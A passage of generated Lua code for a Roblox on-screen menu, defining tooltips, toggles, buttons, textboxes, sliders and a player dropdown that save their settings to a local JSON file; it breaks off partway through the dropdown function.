-- StarterGui.T5784YHRGE89ES98T.Tooltip.tooltipScript
local function C_2b6()
local script = G2L["2b6"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	local TextService = game:GetService("TextService")
	
	local tooltip = screenGui:FindFirstChild("Tooltip")
	if not tooltip then return end
	
	local label = tooltip:FindFirstChild("text")
	if not label then return end
	
	tooltip.Visible = false
	
	local maxWidth = 250
	local offsetX = 12
	local offsetY = 12
	
	local function updateTooltipSize()
		local text = label.Text
		local textSize = TextService:GetTextSize(
			text,
			label.TextSize,
			label.Font,
			Vector2.new(maxWidth - 10, math.huge)
		)
		local width = math.min(textSize.X + 10, maxWidth)
		local height = textSize.Y + 10
		tooltip.Size = UDim2.new(0, width, 0, height)
	end
	
	local function updatePosition()
		local mousePos = UserInputService:GetMouseLocation()
		local guiInset = game:GetService("GuiService"):GetGuiInset()
	
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		local scale = uiScale and uiScale.Scale or 1
	
		tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + offsetX) / scale, 0, (mousePos.Y - guiInset.Y + offsetY) / scale)
	end
	
	UserInputService.TouchMoved:Connect(updatePosition)
	UserInputService.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			updatePosition()
		end
	end)
	
	RunService.RenderStepped:Connect(updatePosition)
	
	label:GetPropertyChangedSignal("Text"):Connect(function()
		updateTooltipSize()
	end)
	
	updateTooltipSize()
	
	local hideTask = nil
	
	function _G.ShowTooltip(text)
		label.Text = text
		tooltip.Visible = true
	end
	
	function _G.HideTooltip()
		tooltip.Visible = false
	end
end;
task.spawn(C_2b6);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ToggleMaster
local function C_2be()
local script = G2L["2be"];
	-- ToggleMaster Script
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local UserInputService = game:GetService("UserInputService")
	local HttpService = game:GetService("HttpService")
	
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	
	local targetColor = colorFrame.BackgroundColor3
	local toggleStates = {}
	
	_G.ConfigData = _G.ConfigData or {}
	
	local CONFIG_FILE = "myconfig.json"
	
	local function saveConfig()
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
		end)
	end
	
	local function loadConfig()
		local success, data = pcall(function()
			return readfile(CONFIG_FILE)
		end)
		if success and data then
			_G.ConfigData = HttpService:JSONDecode(data)
		end
	end
	
	loadConfig()
	
	local allToggles = {}
	local allButtonToggles = {}
	
	local function updateAllColors()
		targetColor = colorFrame.BackgroundColor3
		for _, toggle in pairs(allToggles) do
			toggle.update()
		end
		for _, buttonToggle in pairs(allButtonToggles) do
			buttonToggle.update()
		end
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
	
	local function CreateToggle(config)
		local frameName = config.frame
		local groupboxScript = config.groupbox
		local tooltipText = config.tooltip
		local callback = config.callback
	
		local frame = groupboxScript.Parent:FindFirstChild(frameName)
		if not frame then return end
	
		local button = frame:FindFirstChild("button")
		if not button then return end
	
		local toggleFrame = button:FindFirstChild("toggleFrame")
		if not toggleFrame then return end
	
		local outlineStroke = toggleFrame:FindFirstChild("outlineStroke")
		if not outlineStroke then return end
	
		local toggleFade = toggleFrame:FindFirstChild("toggleFade")
	
		local isToggled = _G.ConfigData[frameName] or false
		local isHovering = false
		toggleStates[button] = isToggled
		
		-- Call callback on load if toggled is true
		if isToggled and callback then
			task.spawn(function()
				callback(true)
			end)
		end
	
		local function updateVisuals()
			if isToggled then
				toggleFrame.BackgroundColor3 = targetColor
				toggleFrame.BorderColor3 = targetColor
				outlineStroke.Color = targetColor
				outlineStroke.Thickness = 1
				outlineStroke.Transparency = isHovering and 0 or 0.5
				if toggleFade then toggleFade.Visible = false end
			else
				toggleFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
				toggleFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
				if toggleFade then toggleFade.Visible = true end
				if isHovering then
					outlineStroke.Color = targetColor
					outlineStroke.Thickness = 1
					outlineStroke.Transparency = 0
				else
					outlineStroke.Color = Color3.fromRGB(0, 0, 0)
					outlineStroke.Thickness = 2
					outlineStroke.Transparency = 0
				end
			end
	
			outlineStroke.ZIndex = isHovering and 99 or 1
		end
	
		updateVisuals()
	
		table.insert(allToggles, {update = updateVisuals})
	
		button.MouseButton1Click:Connect(function()
			isToggled = not isToggled
			toggleStates[button] = isToggled
			_G.ConfigData[frameName] = isToggled
			updateVisuals()
			saveConfig()
			if callback then
				callback(isToggled)
			end
		end)
	
		button.MouseEnter:Connect(function()
			isHovering = true
			outlineStroke.Color = targetColor
			outlineStroke.Thickness = 1
			outlineStroke.Transparency = 0
			outlineStroke.ZIndex = 99
			if tooltipText and _G.ShowTooltip then
				local mousePos = UserInputService:GetMouseLocation()
				local guiInset = game:GetService("GuiService"):GetGuiInset()
				local uiScale = screenGui:FindFirstChildOfClass("UIScale")
				local scale = uiScale and uiScale.Scale or 1
				local tooltip = screenGui:FindFirstChild("Tooltip")
				if tooltip then
					tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
				end
				_G.ShowTooltip(tooltipText)
			end
		end)
	
		button.MouseLeave:Connect(function()
			isHovering = false
			updateVisuals()
			if _G.HideTooltip then
				_G.HideTooltip()
			end
		end)
	end
	
	local function CreateButtonToggle(config)
		local frameName = config.frame
		local groupboxScript = config.groupbox
		local tooltipText = config.tooltip
		local callback = config.callback
		local toggledText = config.toggledText
		local toggledTextColor = config.toggledTextColor or targetColor
	
		local frame = groupboxScript.Parent:FindFirstChild(frameName)
		if not frame then return end
	
		local button = frame:FindFirstChild("button")
		if not button then return end
	
		local outlineStroke = button:FindFirstChild("outlineStroke", true)
		local text = button:FindFirstChild("text")
	
		if not text then return end
	
		local isToggled = _G.ConfigData[frameName] or false
		local originalText = text.Text
		local originalTextColor = text.TextColor3
		local isHovering = false
	
		local function updateVisuals()
			local currentToggledTextColor = config.toggledTextColor or targetColor
			if isToggled then
				button.BackgroundColor3 = targetColor
				button.BorderColor3 = targetColor
				text.Text = toggledText or originalText
				text.TextColor3 = currentToggledTextColor
				if outlineStroke and outlineStroke:IsA("UIStroke") then
					outlineStroke.Color = targetColor
					outlineStroke.Transparency = isHovering and 0 or 0.5
					outlineStroke.Thickness = 1
					outlineStroke.ZIndex = isHovering and 99 or 99
				end
			else
				button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
				button.BorderColor3 = Color3.fromRGB(50, 50, 50)
				text.Text = originalText
				text.TextColor3 = originalTextColor
				if outlineStroke and outlineStroke:IsA("UIStroke") then
					if isHovering then
						outlineStroke.Color = targetColor
						outlineStroke.Thickness = 1
						outlineStroke.Transparency = 0
						outlineStroke.ZIndex = 99
					else
						outlineStroke.Color = Color3.fromRGB(0, 0, 0)
						outlineStroke.Transparency = 0
						outlineStroke.Thickness = 2
						outlineStroke.ZIndex = 1
					end
				end
			end
		end
	
		updateVisuals()
	
		table.insert(allButtonToggles, {update = updateVisuals})
	
		button.MouseButton1Down:Connect(function()
			if not isToggled then
				text.TextColor3 = targetColor
			end
		end)
	
		button.MouseButton1Up:Connect(function()
			if not isToggled then
				text.TextColor3 = originalTextColor
			end
		end)
	
		button.MouseButton1Click:Connect(function()
			isToggled = not isToggled
			_G.ConfigData[frameName] = isToggled
			updateVisuals()
			saveConfig()
			if callback then
				callback(isToggled)
			end
		end)
	
		if outlineStroke and outlineStroke:IsA("UIStroke") then
			button.MouseEnter:Connect(function()
				isHovering = true
				outlineStroke.Color = targetColor
				outlineStroke.Thickness = 1
				outlineStroke.Transparency = 0
				outlineStroke.ZIndex = 99
				if tooltipText and _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
	
			button.MouseLeave:Connect(function()
				isHovering = false
				updateVisuals()
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
	end
	
	_G.CreateToggle = CreateToggle
	_G.CreateButtonToggle = CreateButtonToggle
end;
task.spawn(C_2be);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ButtonMaster
local function C_2bf()
local script = G2L["2bf"];
	-- ButtonMaster Script
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	
	local targetColor = colorFrame.BackgroundColor3
	
	local function CreateButton(config)
		local frameName = config.frame
		local groupboxScript = config.groupbox
		local tooltipText = config.tooltip
		local callback = config.callback
		local needsConfirm = config.needsConfirm or false
		local confirmMessage = config.confirmMessage or "Are you sure?"
		local confirmWait = config.confirmWait or 1
		local afterMessage = config.afterMessage
		local afterMessageWait = config.afterMessageWait or 2
		local canClickDuringAfter = config.canClickDuringAfter or false
		local errorMessage = config.errorMessage
		local holdTime = config.holdtime
		local holdText = config.holdtext
		local holdVisual = config.holdvisual or false
		local holdTextColor = config.holdtextcolor
	
		local frame = groupboxScript.Parent:FindFirstChild(frameName)
		if not frame then return end
	
		local button = frame:FindFirstChild("button")
		if not button then return end
	
		local outlineStroke = button:FindFirstChild("outlineStroke", true)
		local text = button:FindFirstChild("text")
	
		if not text then return end
	
		local originalText = text.Text
		local originalTextColor = text.TextColor3
		local isConfirming = false
		local confirmTask = nil
		local isProcessing = false
	
		local holding = false
		local holdProgress = 0
		local holdConnection = nil
		local fillBar = button:FindFirstChild("fillbar")
	
		local holdColor = targetColor
		if holdTextColor then
			if holdTextColor == "frameColor" then
				holdColor = targetColor
			else
				local r, g, b = holdTextColor:match("(%d+),%s*(%d+),%s*(%d+)")
				if r and g and b then
					holdColor = Color3.fromRGB(tonumber(r), tonumber(g), tonumber(b))
				end
			end
		end
	
		local function stopHold()
			holding = false
			if holdConnection then
				holdConnection:Disconnect()
				holdConnection = nil
			end
			holdProgress = 0
			if fillBar and holdVisual then
				fillBar.Size = UDim2.new(0, 0, 1, 0)
			end
			text.Text = originalText
			text.TextColor3 = originalTextColor
		end
	
		local function executeCallback()
			isProcessing = true
			local success = true
			if callback then
				local result = callback()
				if result ~= nil then
					success = result
				end
			end
	
			local messageToShow = success and afterMessage or errorMessage
	
			if messageToShow then
				local displayText = messageToShow
				if messageToShow:find("%%%.%df") then
					local countdownTask
					countdownTask = task.spawn(function()
						for i = afterMessageWait, 0, -0.1 do
							if not isProcessing then break end
							text.Text = displayText:gsub("(%%%.%df)", function(match)
								return string.format(match, i)
							end)
							task.wait(0.1)
						end
					end)
				else
					text.Text = displayText
				end
				text.TextColor3 = targetColor
				task.delay(afterMessageWait, function()
					if not canClickDuringAfter then
						isProcessing = false
					end
					text.Text = originalText
					text.TextColor3 = originalTextColor
				end)
			else
				isProcessing = false
			end
		end
	
		button.MouseButton1Down:Connect(function()
			if isProcessing and not canClickDuringAfter then return end
	
			if holdTime then
				holding = true
				holdProgress = 0
				if holdText then
					text.Text = holdText
				end
				text.TextColor3 = holdColor
	
				holdConnection = RunService.RenderStepped:Connect(function(dt)
					if not holding then return end
					holdProgress = holdProgress + (dt / holdTime)
					holdProgress = math.clamp(holdProgress, 0, 1)
	
					if fillBar and holdVisual then
						fillBar.Size = UDim2.new(holdProgress, 0, 1, 0)
					end
	
					if holdText and holdText:find("%%%.%df") then
						local remaining = math.max(0, holdTime - (holdProgress * holdTime))
						text.Text = holdText:gsub("(%%%.%df)", function(match)
							return string.format(match, remaining)
						end)
					end
	
					if holdProgress >= 1 then
						stopHold()
						if needsConfirm then
							isConfirming = true
							text.Text = confirmMessage
							text.TextColor3 = targetColor
							confirmTask = task.delay(confirmWait, function()
								isConfirming = false
								text.Text = originalText
								text.TextColor3 = originalTextColor
							end)
						else
							executeCallback()
						end
					end
				end)
			else
				text.TextColor3 = targetColor
			end
		end)
	
		button.MouseButton1Up:Connect(function()
			if holdTime then
				stopHold()
			else
				if not isConfirming and not isProcessing then
					text.TextColor3 = originalTextColor
				end
			end
		end)
	
		button.MouseLeave:Connect(function()
			if holdTime then
				stopHold()
			else
				if not isConfirming and not isProcessing then
					text.TextColor3 = originalTextColor
				end
			end
		end)
	
		button.MouseButton1Click:Connect(function()
			if holdTime then return end
			if isProcessing and not canClickDuringAfter then return end
	
			if needsConfirm then
				if isConfirming then
					if confirmTask then task.cancel(confirmTask) end
					isConfirming = false
					text.Text = originalText
					text.TextColor3 = originalTextColor
					executeCallback()
				else
					isConfirming = true
					text.Text = confirmMessage
					text.TextColor3 = targetColor
					confirmTask = task.delay(confirmWait, function()
						isConfirming = false
						text.Text = originalText
						text.TextColor3 = originalTextColor
					end)
				end
			else
				executeCallback()
			end
		end)
	
		if outlineStroke and outlineStroke:IsA("UIStroke") then
			local originalColor = outlineStroke.Color
			local originalThickness = outlineStroke.Thickness
			local originalTransparency = outlineStroke.Transparency
			outlineStroke.ZIndex = 1
	
			button.MouseEnter:Connect(function()
				outlineStroke.Color = targetColor
				outlineStroke.Thickness = 1
				outlineStroke.Transparency = 0
				outlineStroke.ZIndex = 99
				if tooltipText and _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
	
			button.MouseLeave:Connect(function()
				outlineStroke.Color = originalColor
				outlineStroke.Thickness = originalThickness
				outlineStroke.Transparency = originalTransparency
				outlineStroke.ZIndex = 1
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
	end
	
	_G.CreateButton = CreateButton
	
	-- Store active cancel tokens per frame
	local activeTokens = {}
	
	_G.SetButtonText = function(frameName, message, duration)
		duration = duration or 2
	
		-- Cancel previous token for this frame
		if activeTokens[frameName] then
			activeTokens[frameName].cancelled = true
		end
	
		-- Create new cancel token
		local cancelToken = {cancelled = false}
		activeTokens[frameName] = cancelToken
	
		-- Find all buttons with this frame name
		for _, descendant in pairs(screenGui:GetDescendants()) do
			if descendant.Name == frameName and descendant:IsA("Frame") then
				local button = descendant:FindFirstChild("button")
				if button then
					local text = button:FindFirstChild("text")
					if text then
						local originalText = text.Text
						local originalColor = text.TextColor3
	
						text.Text = message
						text.TextColor3 = targetColor
	
						task.delay(duration, function()
							if not cancelToken.cancelled then
								text.Text = originalText
								text.TextColor3 = originalColor
								activeTokens[frameName] = nil
							end
						end)
						break
					end
				end
			end
		end
	
		return cancelToken
	end
end;
task.spawn(C_2bf);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.TextboxMaster
local function C_2c0()
local script = G2L["2c0"];
	-- TextboxMaster Script
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	local UserInputService = game:GetService("UserInputService")
	local HttpService = game:GetService("HttpService")
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	local targetColor = colorFrame.BackgroundColor3
	
	local allTextboxes = {}
	
	local function updateAllColors()
		targetColor = colorFrame.BackgroundColor3
		for _, textbox in pairs(allTextboxes) do
			textbox.update()
		end
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
	
	_G.ConfigData = _G.ConfigData or {}
	local CONFIG_FILE = "myconfig.json"
	local function saveConfig()
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
		end)
	end
	local function loadConfig()
		local success, data = pcall(function()
			return readfile(CONFIG_FILE)
		end)
		if success and data then
			_G.ConfigData = HttpService:JSONDecode(data)
		end
	end
	loadConfig()
	local function CreateTextbox(config)
		local frameName = config.frame
		local textboxName = config.textboxname
		local tooltipText = config.tooltip
		local textboxColor = config.textboxcolor
		local hoverColor = config.hovercolor
		local callback = config.callback
		local frame = screenGui:FindFirstChild(frameName, true)
		if not frame then return end
		local textboxFrame = frame:FindFirstChild(textboxName)
		if not textboxFrame then return end
		local textbox = textboxFrame:FindFirstChild("textbox")
		if not textbox or not textbox:IsA("TextBox") then return end
		local outlineStroke = textboxFrame:FindFirstChild("outlineStroke", true)
	
		local function getTextboxColor()
			if textboxColor then
				if textboxColor == "frameColor" then
					return targetColor
				else
					local r, g, b = textboxColor:match("(%d+),%s*(%d+),%s*(%d+)")
					if r and g and b then
						return Color3.fromRGB(tonumber(r), tonumber(g), tonumber(b))
					end
				end
			end
			return nil
		end
	
		local function updateTextboxColor()
			local color = getTextboxColor()
			if color then
				textbox.TextColor3 = color
				textbox.PlaceholderColor3 = color
			end
		end
	
		updateTextboxColor()
		table.insert(allTextboxes, {update = updateTextboxColor})
	
		local configKey = frameName .. "_" .. textboxName
		if _G.ConfigData[configKey] then
			textbox.Text = _G.ConfigData[configKey]
		end
		textbox.FocusLost:Connect(function()
			_G.ConfigData[configKey] = textbox.Text
			saveConfig()
			if callback then
				callback(textbox.Text)
			end
		end)
		if hoverColor and outlineStroke and outlineStroke:IsA("UIStroke") then
			local originalColor = outlineStroke.Color
			local originalThickness = outlineStroke.Thickness
			local originalTransparency = outlineStroke.Transparency
			outlineStroke.ZIndex = 1
			local isHovering = false
			local isFocused = false
			local function updateStroke()
				if isFocused or isHovering then
					outlineStroke.Color = targetColor
					outlineStroke.Thickness = 1
					outlineStroke.Transparency = 0
					outlineStroke.ZIndex = 99
				else
					outlineStroke.Color = originalColor
					outlineStroke.Thickness = originalThickness
					outlineStroke.Transparency = originalTransparency
					outlineStroke.ZIndex = 1
				end
			end
			textbox.Focused:Connect(function()
				isFocused = true
				updateStroke()
			end)
			textbox.FocusLost:Connect(function()
				isFocused = false
				updateStroke()
			end)
			textbox.MouseEnter:Connect(function()
				isHovering = true
				updateStroke()
				if tooltipText and _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
			textbox.MouseLeave:Connect(function()
				isHovering = false
				updateStroke()
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
	end
	_G.CreateTextbox = CreateTextbox
end;
task.spawn(C_2c0);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.SliderMaster
local function C_2c1()
local script = G2L["2c1"];
	-- SliderMaster Script
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local UserInputService = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	local HttpService = game:GetService("HttpService")
	
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	
	local targetColor = colorFrame.BackgroundColor3
	
	local allSliders = {}
	
	local function updateAllColors()
		targetColor = colorFrame.BackgroundColor3
		for _, slider in pairs(allSliders) do
			slider.update()
		end
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
	
	_G.ConfigData = _G.ConfigData or {}
	
	local CONFIG_FILE = "myconfig.json"
	
	local function saveConfig()
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
		end)
	end
	
	local function loadConfig()
		local success, data = pcall(function()
			return readfile(CONFIG_FILE)
		end)
		if success and data then
			_G.ConfigData = HttpService:JSONDecode(data)
		end
	end
	
	loadConfig()
	
	local function CreateSlider(config)
		local frameName = config.frame
		local groupboxScript = config.groupbox
		local tooltipText = config.tooltip
		local callback = config.callback
		local minValue = config.minvalue or 0
		local maxValue = config.maxvalue
		local highestValue = config.highestvalue or maxValue
		local decimalPlaces = config.decimalplaces or 0
		local snap = config.snap or false
		local defaultValue = config.default
	
		if not maxValue then return end
	
		local frame = groupboxScript.Parent:FindFirstChild(frameName)
		if not frame then return end
	
		local button = frame:FindFirstChild("button")
		if not button then return end
	
		local sliderFrame = button:FindFirstChild("sliderFrame")
		if not sliderFrame then return end
	
		local fillBar = sliderFrame:FindFirstChild("fillbar")
		local text = button:FindFirstChild("text")
		local outlineStroke = sliderFrame:FindFirstChild("outlineStroke", true)
	
		if not fillBar or not text then return end
	
		fillBar.BackgroundColor3 = colorFrame.BackgroundColor3
	
		local function updateFillBarColor()
			fillBar.BackgroundColor3 = colorFrame.BackgroundColor3
		end
	
		table.insert(allSliders, {update = updateFillBarColor})
	
		local dragging = false
		local currentValue = _G.ConfigData[frameName]
	
		if not currentValue then
			currentValue = defaultValue or minValue
			_G.ConfigData[frameName] = currentValue
			saveConfig()
		end
	
		local function formatValue(value)
			if decimalPlaces == math.huge then
				return tostring(value)
			else
				return string.format("%." .. decimalPlaces .. "f", value)
			end
		end
	
		local function updateSlider(value)
			value = math.clamp(value, minValue, maxValue)
	
			if snap then
				local snapIncrement = 10 ^ -decimalPlaces
				value = math.floor(value / snapIncrement + 0.5) * snapIncrement
			end
	
			if value >= maxValue and highestValue > maxValue then
				value = highestValue
			end
	
			currentValue = value
	
			local percentage = (value - minValue) / (maxValue - minValue)
			fillBar.Size = UDim2.new(math.clamp(percentage, 0, 1), 0, 1, 0)
	
			if value >= maxValue and highestValue == math.huge then
				text.Text = formatValue(minValue) .. " / inf"
			else
				text.Text = formatValue(value) .. " / " .. formatValue(maxValue)
			end
	
			_G.ConfigData[frameName] = value
			saveConfig()
	
			if callback then
				callback(value)
			end
		end
	
		local function updateFromMouse(input)
			local pos = sliderFrame.AbsolutePosition
			local size = sliderFrame.AbsoluteSize
			local mouseX = input.Position.X
	
			local percentage = math.clamp((mouseX - pos.X) / size.X, 0, 1)
			local value = minValue + (percentage * (maxValue - minValue))
	
			updateSlider(value)
		end
	
		sliderFrame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				updateFromMouse(input)
			end
		end)
	
		sliderFrame.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = false
			end
		end)
	
		UserInputService.InputChanged:Connect(function(input)
			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
				updateFromMouse(input)
			end
		end)
	
		if outlineStroke and outlineStroke:IsA("UIStroke") then
			local originalColor = outlineStroke.Color
			local originalThickness = outlineStroke.Thickness
			local originalTransparency = outlineStroke.Transparency
			outlineStroke.ZIndex = 1
	
			sliderFrame.MouseEnter:Connect(function()
				outlineStroke.Color = targetColor
				outlineStroke.Thickness = 1
				outlineStroke.Transparency = 0
				outlineStroke.ZIndex = 99
				if tooltipText and _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
	
			sliderFrame.MouseLeave:Connect(function()
				outlineStroke.Color = originalColor
				outlineStroke.Thickness = originalThickness
				outlineStroke.Transparency = originalTransparency
				outlineStroke.ZIndex = 1
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
	
		updateSlider(currentValue)
	end
	
	_G.CreateSlider = CreateSlider
end;
task.spawn(C_2c1);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.DropdownMaster
local function C_2c2()
local script = G2L["2c2"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	local Players = game:GetService("Players")
	local Teams = game:GetService("Teams")
	local UserInputService = game:GetService("UserInputService")
	local HttpService = game:GetService("HttpService")
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	local targetColor = colorFrame.BackgroundColor3
	
	local function updateAllColors()
		targetColor = colorFrame.BackgroundColor3
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
	
	_G.ConfigData = _G.ConfigData or {}
	local CONFIG_FILE = "myconfig.json"
	local function saveConfig()
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
		end)
	end
	local function loadConfig()
		local success, data = pcall(function()
			return readfile(CONFIG_FILE)
		end)
		if success and data then
			_G.ConfigData = HttpService:JSONDecode(data)
		end
	end
	loadConfig()
	local cachedThumbs = {}
	local function getThumb(userId)
		if cachedThumbs[userId] then return cachedThumbs[userId] end
		local ok, img = pcall(function()
			return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
		end)
		local result = ok and img or ""
		cachedThumbs[userId] = result
		return result
	end
	local currentOpenDropdown = nil
	local function CreateDropdown(config)
		local frameName = config.frame
		local groupboxScript = config.groupbox
		local tooltipText = config.tooltip
		local callback = config.callback
		local dropdownType = config.dropdowntype or "custom"
		local customList = config.customlist or {}
		local multiSelect = config.multiselect or false
		local maxMultiSelect = config.maxmultiselect
		local maxVisible = config.max
		local hasSearchbar = config.searchbar or false
		local playerIcon = config.playericon or false
		local defaultSelection = config.defaultselection
		local showSelectAll = config.showselectall or false
		local showUserButtons = config.showuserbuttons or false
		local frame = groupboxScript.Parent:FindFirstChild(frameName)
		if not frame then return end
		local button = frame:FindFirstChild("button")
		if not button then return end
		local dropdownFrame = button:FindFirstChild("dropdownFrame")
		local search = button:FindFirstChild("search")
		local arrow = button:FindFirstChild("arrow")
		local text = button:FindFirstChild("text")
		local outlineStroke = dropdownFrame and dropdownFrame:FindFirstChild("outlineStroke", true)
		if not dropdownFrame or not search or not arrow or not text then return end
		local dropdownList = screenGui:FindFirstChild("Dropdown")
		if not dropdownList then return end
		local dropdownScrolling = dropdownList:FindFirstChild("dropdownScrolling")
		if not dropdownScrolling or not dropdownScrolling:IsA("ScrollingFrame") then return end
		local buttonTemplate = dropdownScrolling:FindFirstChild("button")
		if not buttonTemplate then return end
		local dropdownSelectAll = dropdownList:FindFirstChild("dropdownSelectAll")
		local selectAllBtn = dropdownSelectAll and dropdownSelectAll:FindFirstChild("selectall")
		local unselectAllBtn = dropdownSelectAll and dropdownSelectAll:FindFirstChild("unselectall")
		local dropdownUsers = dropdownList:FindFirstChild("dropdownUsers")
		local displayBtn = dropdownUsers and dropdownUsers:FindFirstChild("display")
		local friendsBtn = dropdownUsers and dropdownUsers:FindFirstChild("friends")
		local uiListLayout = dropdownScrolling:FindFirstChild("UIListLayout")
		if not uiListLayout then
			uiListLayout = Instance.new("UIListLayout")
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Parent = dropdownScrolling
		end
		local isOpen = false
		local selectedItems = {}
		local selectedSingle = nil
		local originalText = text.Text
		local showDisplayNames = false
		local showFriendsOnly = false
		local configKey = frameName
		if _G.ConfigData[configKey] then
			if multiSelect then
				selectedItems = _G.ConfigData[configKey]
			else
				selectedSingle = _G.ConfigData[configKey]
			end
		elseif defaultSelection then
			if defaultSelection == "none" then
				selectedSingle = nil
				text.Text = "--"
			elseif dropdownType == "custom" and not multiSelect then
				selectedSingle = defaultSelection
				_G.ConfigData[configKey] = defaultSelection
				saveConfig()
			end
		end
		local function updateText()
			if multiSelect then
				local count = 0
				local names = {}
				for item, _ in pairs(selectedItems) do
					count = count + 1
					table.insert(names, item)
				end
				if count == 0 then
					if defaultSelection == "none" then
						text.Text = "--"
					else
						text.Text = originalText
					end
				else
					local combined = table.concat(names, ", ")
					local testLabel = text:Clone()
					testLabel.Text = combined
					testLabel.Parent = text.Parent
					if testLabel.TextFits then
						text.Text = combined
					else
						text.Text = count .. (dropdownType == "players" and " Players Selected" or " Selected")
					end
					testLabel:Destroy()
				end
			else
				if selectedSingle then
					text.Text = selectedSingle
				else
					if defaultSelection == "none" then
						text.Text = "--"
					else
						text.Text = originalText
					end
				end
			end
		end
		local function updateDropdownPosition()
			local absPos = dropdownFrame.AbsolutePosition
			local absSize = dropdownFrame.AbsoluteSize
